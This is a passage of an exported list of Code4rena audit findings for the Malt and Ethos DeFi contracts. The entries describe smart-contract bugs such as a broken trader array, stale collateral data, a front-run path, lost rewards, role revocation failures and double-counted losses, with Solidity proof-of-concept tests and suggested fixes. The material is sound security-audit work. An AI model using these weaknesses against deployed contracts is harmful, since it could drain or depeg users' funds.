swingTraders[activeTraders[i]];       maltBalance += malt.balanceOf(trader.traderContract);       collateralBalance += collateralToken.balanceOf(trader.traderContract);     }   } ``` Wrong calculateSwingTraderMaltRatio() will cause MaltDataLab.getRealBurnBudget()/getSwingTraderEntryPrice() to be wrong. ```solidity   function calculateSwingTraderMaltRatio()     public     view     returns (uint256 maltRatio)   {     uint256[] memory traderIds = activeTraders;     uint256 length = traderIds.length;     uint256 decimals = collateralToken.decimals();     uint256 maltDecimals = malt.decimals();     uint256 totalMaltBalance;     uint256 totalCollateralBalance;      for (uint256 i; i < length; ++i) {       SwingTraderData memory trader = swingTraders[activeTraders[i]];       totalMaltBalance += malt.balanceOf(trader.traderContract);       totalCollateralBalance += collateralToken.balanceOf(         trader.traderContract       );     }      totalMaltBalance = maltDataLab.maltToRewardDecimals(totalMaltBalance);      uint256 stMaltValue = ((totalMaltBalance * maltDataLab.priceTarget()) /       (10**decimals));      uint256 netBalance = totalCollateralBalance + stMaltValue;      if (netBalance > 0) {       maltRatio = ((stMaltValue * (10**decimals)) / netBalance);     } else {       maltRatio = 0;     }   } ``` What's more serious is that even if toggleTraderActive is called again, only one traderId will pop up from activeTraders, and the other traderId cannot be popped up. ```solidity     } else {       // Becoming inactive so remove from activePools       uint256 index = trader.index;       uint256 lastTrader = activeTraders[activeTraders.length - 1];        activeTraders[index] = lastTrader;       activeTraders.pop();        swingTraders[lastTrader].index = index;       trader.index = 0;     } ``` This causes the trade to participate in the calculation of getTokenBalances()/calculateSwingTraderMaltRatio() even if the trade is deactive. Considering that the active parameter is likely to be false when addSwingTrader is called and cannot be recovered, this vulnerability should be high risk ## Proof of Concept ```solidity   function testAddSwingTrader(address newSwingTrader) public {     _setupContract();     vm.assume(newSwingTrader != address(0));     vm.prank(admin);     swingTraderManager.addSwingTrader(3, newSwingTrader, false, \"Test\");      (       uint256 id,       uint256 index,       address traderContract,       string memory name,       bool active     ) = swingTraderManager.swingTraders(3);      assertEq(id, 3);     assertEq(index, 2);     assertEq(traderContract, newSwingTrader);     assertEq(name, \"Test\");     assertEq(active, false);     vm.prank(admin);     swingTraderManager.toggleTraderActive(3);     assertEq(swingTraderManager.activeTraders(2),3);     assertEq(swingTraderManager.activeTraders(3),3); // @audit:activeTraders[2] = activeTraders[3] = 3     vm.prank(admin);     swingTraderManager.toggleTraderActive(3);     assertEq(swingTraderManager.activeTraders(2),3);   } ``` https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L397-L447 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff   function addSwingTrader(     uint256 traderId,     address _swingTrader,     bool active,     string calldata name   ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {     SwingTraderData storage trader = swingTraders[traderId];     require(traderId > 2 && trader.id == 0, \"TraderId already used\");     require(_swingTrader != address(0), \"addr(0)\");      swingTraders[traderId] = SwingTraderData({       id: traderId, -     index: activeTraders.length, +     index: active ? activeTraders.length\u00a0: 0,       traderContract: _swingTrader,       name: name,       active: active     }); +  if(active) activeTraders.push(traderId);  -   activeTraders.push(traderId);      emit AddSwingTrader(traderId, name, active, _swingTrader);   } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/11", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/cccz-Q.md)."}, {"title": "StabilizerNode.stabilize uses stale GlobalImpliedCollateralService data, which will make stabilize incorrect", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/9", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161-L237   # Vulnerability details  ## Impact In StabilizerNode.stabilize, impliedCollateralService.syncGlobalCollateral() is called only at the end of the function to synchronize the GlobalImpliedCollateralService data. ```solidity     if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {       lastStabilize = block.timestamp;       impliedCollateralService.syncGlobalCollateral();       return;     } ...     if (trackAfterStabilize) {       maltDataLab.trackPool();     }     impliedCollateralService.syncGlobalCollateral();     lastStabilize = block.timestamp;   } ``` syncGlobalCollateral will use the data in getCollateralizedMalt(), which includes the collateralToken balance in overflowPool/swingTraderManager/liquidityExtension and the malt balance in swingTraderManager. ```solidity   function syncGlobalCollateral() public onlyActive {     globalIC.sync(getCollateralizedMalt());   } ...   function getCollateralizedMalt() public view returns (PoolCollateral memory) {     uint256 target = maltDataLab.priceTarget();      uint256 unity = 10**collateralToken.decimals();      // Convert all balances to be denominated in units of Malt target price     uint256 overflowBalance = maltDataLab.rewardToMaltDecimals((collateralToken.balanceOf(       address(overflowPool)     ) * unity) / target);     uint256 liquidityExtensionBalance = (collateralToken.balanceOf(       address(liquidityExtension)     ) * unity) / target;     (       uint256 swingTraderMaltBalance,       uint256 swingTraderBalance     ) = swingTraderManager.getTokenBalances();     swingTraderBalance = (swingTraderBalance * unity) / target; ``` Since StabilizerNode.stabilize will use the results of maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice to stabilize, and maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice will use `GlobalImpliedCollateralService.collateralRatio` , to ensure correct stabilization, the data in GlobalServiceImpliedCollateralService should be the latest. ```solidity   function getActualPriceTarget() external view returns (uint256) {     uint256 unity = 10**collateralToken.decimals();     uint256 icTotal = maltToRewardDecimals(globalIC.collateralRatio()); ...   function getSwingTraderEntryPrice()     external     view     returns (uint256 stEntryPrice)   {     uint256 unity = 10**collateralToken.decimals();     uint256 icTotal = maltToRewardDecimals(globalIC.collateralRatio()); ``` But since impliedCollateralService.syncGlobalCollateral() is not called before StabilizerNode.stabilize calls maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice, this will cause StabilizerNode.stabilize to use stale GlobalImpliedCollateralService data, which will make stabilize incorrect.  A simple example would be: 1. impliedCollateralService.syncGlobalCollateral() is called to synchronize the latest data 2. SwingTraderManager.delegateCapital is called, and the collateralToken is taken out from SwingTrader, which will make the `GlobalImpliedCollateralService.collateralRatio` larger than the actual collateralRatio. ```solidity   function delegateCapital(uint256 amount, address destination)     external     onlyRoleMalt(CAPITAL_DELEGATE_ROLE, \"Must have capital delegation privs\")     onlyActive   {     collateralToken.safeTransfer(destination, amount);     emit Delegation(amount, destination, msg.sender);   } ...   function collateralRatio() public view returns (uint256) {     uint256 decimals = malt.decimals();     uint256 totalSupply = malt.totalSupply();     if (totalSupply == 0) {       return 0;     }     return (collateral.total * (10**decimals)) / totalSupply; // @audit: collateral.total is larger than the actual   } ``` 3. When StabilizerNode.stabilize is called, it will use the stale collateralRatio for calculation. If the collateralRatio is too large, the results of maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice will be incorrect, thus making stabilize incorrect.  Since stabilize is a core function of the protocol, stabilizing with the wrong data is likely to cause malt to be depegged, so the vulnerability should be high-risk.  ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161-L237 https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/ImpliedCollateralService.sol#L89-L131 ## Tools Used None ## Recommended Mitigation Steps Call impliedCollateralService.syncGlobalCollateral() before StabilizerNode.stabilize calls maltDataLab.getActualPriceTarget.  ```diff   function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {     // Ensure data consistency     maltDataLab.trackPool();      // Finalize auction if possible before potentially starting a new one     auction.checkAuctionFinalization();  +  impliedCollateralService.syncGlobalCollateral();      require(       block.timestamp >= stabilizeWindowEnd || _stabilityWindowOverride(),       \"Can't call stabilize\"     );     stabilizeWindowEnd = block.timestamp + stabilizeBackoffPeriod;      // used in 3 location.     uint256 exchangeRate = maltDataLab.maltPriceAverage(priceAveragePeriod);     bool stabilizeToPeg = onlyStabilizeToPeg; // gas      if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {       lastStabilize = block.timestamp;       impliedCollateralService.syncGlobalCollateral();       return;     }      emit Stabilize(block.timestamp, exchangeRate);      (uint256 livePrice, ) = dexHandler.maltMarketPrice();      uint256 priceTarget = maltDataLab.getActualPriceTarget(); ```"}, {"title": "RewardThrottle.populateFromPreviousThrottle may be exposed to front-run attack", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L660-L688   # Vulnerability details  ## Impact RewardThrottle.populateFromPreviousThrottle allows ADMIN_ROLE to use epochData from previousThrottle to populate state from activeEpoch to epoch in current RewardThrottle. ```solidity   function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)     external     onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")   {     RewardThrottle previous = RewardThrottle(previousThrottle);     uint256 _activeEpoch = activeEpoch; // gas      for (uint256 i = _activeEpoch; i < epoch; ++i) {       (         uint256 profit,         uint256 rewarded,         uint256 bondedValue,         uint256 desiredAPR,         uint256 epochsPerYear,         uint256 cumulativeCashflowApr,         uint256 cumulativeApr       ) = previous.epochData(i);        state[i].bondedValue = bondedValue;       state[i].profit = profit;       state[i].rewarded = rewarded;       state[i].epochsPerYear = epochsPerYear;       state[i].desiredAPR = desiredAPR;       state[i].cumulativeCashflowApr = cumulativeCashflowApr;       state[i].cumulativeApr = cumulativeApr;     }      activeEpoch = epoch;   } ``` But since populateFromPreviousThrottle and _fillInEpochGaps have basically the same function, a malicious user can call fillInEpochGaps to front-run populateFromPreviousThrottle. ```solidity   function _fillInEpochGaps(uint256 epoch) internal {     uint256 epochsPerYear = timekeeper.epochsPerYear();     uint256 _activeEpoch = activeEpoch; // gas      state[_activeEpoch].bondedValue = bonding.averageBondedValue(_activeEpoch);     state[_activeEpoch].epochsPerYear = epochsPerYear;     state[_activeEpoch].desiredAPR = targetAPR;      if (_activeEpoch > 0) {       state[_activeEpoch].cumulativeCashflowApr =         state[_activeEpoch - 1].cumulativeCashflowApr +         epochCashflowAPR(_activeEpoch - 1);       state[_activeEpoch].cumulativeApr =         state[_activeEpoch - 1].cumulativeApr +         epochAPR(_activeEpoch - 1);     }      // Avoid issues if gap between rewards is greater than one epoch     for (uint256 i = _activeEpoch + 1; i <= epoch; ++i) {       if (!state[i].active) {         state[i].bondedValue = bonding.averageBondedValue(i);         state[i].profit = 0;         state[i].rewarded = 0;         state[i].epochsPerYear = epochsPerYear;         state[i].desiredAPR = targetAPR;         state[i].cumulativeCashflowApr =           state[i - 1].cumulativeCashflowApr +           epochCashflowAPR(i - 1);         state[i].cumulativeApr = state[i - 1].cumulativeApr + epochAPR(i - 1);         state[i].active = true;       }     }      activeEpoch = epoch;   } ``` The only difference is that it seems that populateFromPreviousThrottle can make epoch and activeEpoch greater than timekeeper.epoch(), thereby updating the state for future epochs, but _fillInEpochGaps makes activeEpoch = timekeeper.epoch(), thereby invalidating populateFromPreviousThrottle for future updates. (This usage should be very unlikely) ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L660-L688 ## Tools Used None ## Recommended Mitigation Steps If populateFromPreviousThrottle is used to initialize the state in the current RewardThrottle, it should be called on contract setup"}, {"title": "LinearDistributor.declareReward: previouslyVested may update incorrectly, which will cause some rewards to be lost", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-15"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/LinearDistributor.sol#L111-L153   # Vulnerability details  ## Impact In LinearDistributor.declareReward , distributed represents the reward to distribute and is calculated using netVest(currentlyVested - previouslyVested). At the same time, distributed cannot exceed balance, which means that if balance < linearBondedValue * netVest / vestingBondedValue, part of the rewards in netVest will be lost. ```solidity     uint256 netVest = currentlyVested - previouslyVested;     uint256 netTime = block.timestamp - previouslyVestedTimestamp;      if (netVest == 0 || vestingBondedValue == 0) {       return;     }      uint256 linearBondedValue = rewardMine.valueOfBonded();      uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;     uint256 balance = collateralToken.balanceOf(address(this));      if (distributed > balance) {       distributed = balance;     }  ``` At the end of the function, previouslyVested is directly assigned to currentlyVested instead of using the Vested adjusted according to distributed, which means that the previously lost rewards will also be skipped in the next distribution. ```solidity     previouslyVested = currentlyVested;     previouslyVestedTimestamp = block.timestamp; ``` Also, in the next distribution, bufferRequirement will be small because distributed is small, so it may increase the number of forfeits. ```     if (netTime < buf) {       bufferRequirement = (distributed * buf * 10000) / netTime / 10000;     } else {       bufferRequirement = distributed;     }      if (balance > bufferRequirement) {       // We have more than the buffer required. Forfeit the rest       uint256 net = balance - bufferRequirement;       _forfeit(net);     } ``` ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/LinearDistributor.sol#L111-L153 ## Tools Used None ## Recommended Mitigation Steps Consider adapting previouslyVested based on distributed ```diff     uint256 linearBondedValue = rewardMine.valueOfBonded();      uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;     uint256 balance = collateralToken.balanceOf(address(this));      if (distributed > balance) {       distributed = balance; +    currentlyVested = distributed * vestingBondedValue / linearBondedValue + previouslyVested;     } ```"}, {"title": "MaltRepository._revokeRole may not work correctly", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/5", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/Repository.sol#L64-L74   # Vulnerability details  ## Impact MaltRepository inherits from AccessControl and adds validation of validRoles to the hasRole function, which means that even if super.hasRole(role, account) == true, if validRoles[role] == false hasRole will return false, which will cause _revokeRole to not work correctly. ```solidity   function hasRole(bytes32 role, address account)     public     view     override     returns (bool)   {     // Timelock has all possible permissions     return       (super.hasRole(role, account) && validRoles[role]) ||       super.hasRole(TIMELOCK_ROLE, account);   } ``` Consider the case where alice is granted ADMIN_ROLE, then ADMIN_ROLE is removed in the removeRole function, validRoles[ADMIN_ROLE] == false.  ```solidity   function removeRole(bytes32 role) external onlyRole(getRoleAdmin(role)) {     validRoles[role] = false;     emit RemoveRole(role);   } ``` Now if the revokeRole function is called on alice, in the _revokeRole, since hasRole returns false, alice's ADMIN_ROLE will not be revoked.   Since removeRole ends silently, this may actually cause the caller to incorrectly assume that alice's ADMIN_ROLE has been revoked  ```solidity     function _revokeRole(bytes32 role, address account) internal virtual {         if (hasRole(role, account)) {             _roles[role].members[account] = false;             emit RoleRevoked(role, account, _msgSender());         }     } ``` In addition, the renounceRole and _transferRole functions will also be affected. In particular, the _transferRole function, if you want to transfer alice's role to bob, both alice and bob will have the role if validRoles[role]==false. ```solidity   function _transferRole(     address newAccount,     address oldAccount,     bytes32 role   ) internal {     _revokeRole(role, oldAccount);     _grantRole(role, newAccount);   } ...     function renounceRole(bytes32 role, address account) public virtual override {         require(account == _msgSender(), \"AccessControl: can only renounce roles for self\");          _revokeRole(role, account);     } ``` ## Proof of Concept https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/Repository.sol#L64-L74 https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/Repository.sol#L99-L102 ## Tools Used None ## Recommended Mitigation Steps Override renounceRole and removeRole in the MaltRepository and modify them as follows ```diff     function renounceRole(bytes32 role, address account) public virtual override { +     require(validRoles[role], \"Unknown role\");         require(account == _msgSender(), \"AccessControl: can only renounce roles for self\");          _revokeRole(role, account);     } ...     function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) { +     require(validRoles[role], \"Unknown role\");         _revokeRole(role, account);     } ...   function _transferRole(     address newAccount,     address oldAccount,     bytes32 role   ) internal { +  require(validRoles[role], \"Unknown role\");     _revokeRole(role, oldAccount);     _grantRole(role, newAccount);   } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/3", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-04"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/KingNFT-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/840", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/MohammedRizwan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/839", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/SleepingBugs-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/828", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-09"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Josiah-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/824", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-11"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Udsen-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/820", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/0xsomeone-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/817", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/yongskiws-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/773", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-17"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/rbserver-Q.md)."}, {"title": "Add grace period to avoid massive liquidations", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/771", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-18"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/81ab0ff84b113f49f9d3390ea308bae57a1faa5b/Ethos-Core/contracts/PriceFeed.sol#L188   # Vulnerability details  ## Impact  PriceFeed from Liquity is designed and tested on Ethereum/L1. On Optimism, after a sequencer downtime, all Chainlink's L1 to L2 price movements are processed from the [CTC](https://github.com/ethereum-optimism/optimism/blob/master/packages/contracts/contracts/L1/rollup/CanonicalTransactionChain.sol) queue which may cause chaos and rush liquidators into mass liquidating borrowers.  Raising as Medium and leaving to Judge's decision if mass liquidation risk is Med or High.  ## Proof of Concept  While the Optimism L2 sequencer is down, Chainlink (and probably Tellor) keeps sending price feeds from L1 to L2 through the [CTC](https://github.com/ethereum-optimism/optimism/blob/master/packages/contracts/contracts/L1/rollup/CanonicalTransactionChain.sol) which enqueues them and executes them in the arrival order once the sequencer is back online. Since liquidations are handled mainly by bots, they can also use the [CTC](https://github.com/ethereum-optimism/optimism/blob/master/packages/contracts/contracts/L1/rollup/CanonicalTransactionChain.sol) to enqueue liquidations from L1 to L2 that, once the sequencer is back online, will be executed before the borrowers have a chance to react likely causing mass liquidations (these transactions are always executed first when the sequencer comes back online).  This is unfair to borrowers, as they were unable to act on their positions even if they wanted to, due to the L2 downtime. Indeed, while in theory some borrowers may still avoid liquidation by closing their position through the [CTC](https://github.com/ethereum-optimism/optimism/blob/master/packages/contracts/contracts/L1/rollup/CanonicalTransactionChain.sol), it is unlikely that normal borrowers would have the knowledge to do so.  For more information on how outages are handled on Optimism refer to [Handling outages on Optimism and Metis](https://docs.chain.link/data-feeds/l2-sequencer-feeds/#handling-outages-on-optimism-and-metis).  This is also explained in [Aave V3 Technical Paper](https://github.com/aave/aave-v3-core/blob/master/techpaper/Aave_V3_Technical_Paper.pdf) in the last paragraph of section 4.6 Price Oracle Sentinel.  ![Aave V3 Technical Paper Excerpt](https://i.imgur.com/SrxOiJZ.png) See also Aave's [PriceOracleSentinel.sol](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/configuration/PriceOracleSentinel.sol)  ## Tools Used n/a  ## Recommended Mitigation Steps  Implement a grace period once the sequencer comes back online that prevents new borrowing and liquidations during the grace period. For this, the Chainlink sequencer uptime feed can be used to detect the condition and apply the grace period similarly to how it is demonstrated in the following [Example code](https://docs.chain.link/data-feeds/l2-sequencer-feeds/#example-code).  Eventually add logic to ignore the grace period if TCR < CCR or for heavily undercollateralized positions similarly to Aave.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/765", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/delfin454000-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/762", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/PawelK-Q.md)."}, {"title": "_harvestCore() roi calculation error", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/752", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L141   # Vulnerability details  ## Impact _harvestCore() roi calculation error,may double  ## Proof of Concept The _harvestCore() will calculate the roi and repayment values The implementation code is as follows: ```solidity     function _harvestCore(uint256 _debt) internal override returns (int256 roi, uint256 repayment) {         _claimRewards();         uint256 numSteps = steps.length;         for (uint256 i = 0; i < numSteps; i = i.uncheckedInc()) {             address[2] storage step = steps[i];             IERC20Upgradeable startToken = IERC20Upgradeable(step[0]);             uint256 amount = startToken.balanceOf(address(this));             if (amount == 0) {                 continue;             }             _swapVelo(step[0], step[1], amount, VELO_ROUTER);         }          uint256 allocated = IVault(vault).strategies(address(this)).allocated;         uint256 totalAssets = balanceOf();         uint256 toFree = _debt;          if (totalAssets > allocated) {             uint256 profit = totalAssets - allocated;             toFree += profit;             roi = int256(profit);         } else if (totalAssets < allocated) {             roi = -int256(allocated - totalAssets);         }          (uint256 amountFreed, uint256 loss) = _liquidatePosition(toFree);         repayment = MathUpgradeable.min(_debt, amountFreed);         roi -= int256(loss);//<------\u8fd9\u4e2a\u5730\u65b9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u91cd\u590d     } ``` The last line may cause double counting of losses For example, the current: vault.allocated = 9 vault.strategy.allocBPS = 9000 strategy.totalAssets = 9  Suppose that after some time, strategy loses 2, then: strategy.totalAssets = 9 - 2 = 7 Also the administrator sets vault.strategy.allocBPS = 0  This executes harvest()->_harvestCore(9) to get roi = 4 repayment = 7  The actual loss of 2, but roi = 4 (double), test code as follows:  add to test/starter-test.js 'Vault Tests'  ```solidity     it.only('test_roi', async function () {       const {vault, strategy, wantHolder, strategist} = await loadFixture(deployVaultAndStrategyAndGetSigners);       const depositAmount = toWantUnit('10');       await vault.connect(wantHolder)['deposit(uint256)'](depositAmount);       await strategy.harvest();        const balanceOf = await strategy.balanceOf();       console.log(`strategy balanceOf: ${balanceOf}`);       // allocated = 9       // 1.loss 2, left 7       await strategy.lossFortest(toWantUnit('2'));       // 2.modify bps=>0       await vault.connect(strategist).updateStrategyAllocBPS(strategy.address, 0);       // 3.so debt = 9       await strategy.harvest();        const {allocated, losses, allocBPS} = await vault.strategies(strategy.address);       console.log(`losses: ${losses}`);       console.log(`allocated: ${allocated}`);       console.log(`allocBPS: ${allocBPS}`);     });  ``` add to ReaperStrategyGranarySupplyOnly.sol ```solidity     function lossFortest(uint256 amout) external{         ILendingPool(ADDRESSES_PROVIDER.getLendingPool()).withdraw(address(want), amout, address(1));             } ```  ```console $ npx hardhat test test/starter-test.js    Vaults     Vault Tests strategy balanceOf: 900000000 losses: 400000000     <--------will double allocated: 0 allocBPS: 0 ```  The last vault's allocated is correct, but the loss is wrong Statistics and bpsChange of _reportLoss() will be wrong    ## Tools Used  ## Recommended Mitigation Steps  remove ` roi -= int256(loss);`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/748", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-23"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/CodingNameKiki-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/745", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-24"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/Kaysoft-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/742", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-25"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/tsvetanovv-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/734", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-29"], "target": "2023-02-ethos-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-ethos-findings/blob/main/data/hansfriese-Q.md)."}, {"title": "`ReaperBaseStrategyv4.harvest()` might revert in an emergency.", "html_url": "https://github.com/code-423n4/2023-02-ethos-findings/issues/730", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-02-ethos-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L109 https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200   # Vulnerability details  ## Impact `ReaperBaseStrategyv4.harvest()` might revert in an emergency if there is no position on the lending pool.  As a result, the funds might be locked inside the strategy.  ## Proof of Concept The main problem is that [Aave lending pool doesn't allow 0 withdrawals](https://github.com/aave/protocol-v2/blob/554a2ed7ca4b3565e2ceaea0c454e5a70b3a2b41/contracts/protocol/libraries/logic/ValidationLogic.sol#L60-L70).  ```solidity   function validateWithdraw(     address reserveAddress,     uint256 amount,     uint256 userBalance,     mapping(address => DataTypes.ReserveData) storage reservesData,     DataTypes.UserConfigurationMap storage userConfig,     mapping(uint256 => address) storage reserves,     uint256 reservesCount,     address oracle   ) external view {     require(amount != 0, Errors.VL_INVALID_AMOUNT); ```  So the below scenario would be possible.  1. After depositing and withdrawing from the Aave lending pool, the current position is 0 and the strategy is in debt. 2. It's possible that the strategy has some want balance in the contract but no position on the lending pool. It's because `_adjustPosition()` remains the debt during reinvesting and also, there is an `authorizedWithdrawUnderlying()` for `STRATEGIST` to withdraw from the lending pool. 3. If the strategy is in an emergency, `harvest()` tries to liquidate all positions(=0 actually) and it will revert because of 0 withdrawal from Aave. 4. Also, `withdraw()` will revert at [L98](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L98) as the strategy is in the debt.  As a result, the funds might be locked inside the strategy unless the `emergency` mode is canceled.  ## Tools 